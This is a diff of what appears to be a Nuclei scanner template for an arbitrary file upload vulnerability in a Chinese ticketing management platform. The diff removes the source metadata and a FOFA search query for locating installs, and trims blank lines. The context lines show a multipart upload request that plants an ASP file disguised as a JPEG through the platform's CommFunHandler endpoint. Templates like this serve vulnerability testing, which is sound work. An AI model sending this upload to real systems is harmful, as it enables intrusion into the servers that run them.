@@ -3,12 +3,8 @@ info:
   name: 中成科信票务管理平台任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kg743pnz5wt5umz5'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kg743pnz5wt5umz5
-    fofa: body="技术支持：北京中成科信科技发展有限公司"
 http:
 - raw:
   - 'POST /SystemManager/Comm/CommFunHandler.ashx HTTP/1.1
@@ -41,8 +37,6 @@ http:
     Content-Type: multipart/form-data; boundary=--------------------------354575237365372692397370
 
 
-
-
     ----------------------------354575237365372692397370
 
 
@@ -50,8 +44,6 @@ http:
 
 
     Content-Type: image/jpeg
-
-
 
 
     <%
@@ -69,8 +61,6 @@ http:
     Content-Disposition: form-data; name="fileName"
 
 
-
-
     dudesite.asp
 
 
@@ -78,8 +68,6 @@ http:
 
 
     Content-Disposition: form-data; name="Method"
-
-
 
 
     UploadZoneImg
@@ -91,14 +79,10 @@ http:
     Content-Disposition: form-data; name="solutionNo"
 
 
-
-
     ----------------------------354575237365372692397370
 
 
     Content-Disposition: form-data; name="siteNo"
-
-
 
 
     1
@@ -110,8 +94,6 @@ http:
     Content-Disposition: form-data; name="showNo"
 
 
-
-
     1
 
 
@@ -119,8 +101,6 @@ http:
 
 
     Content-Disposition: form-data; name="showingNo"
-
-
 
 
     1
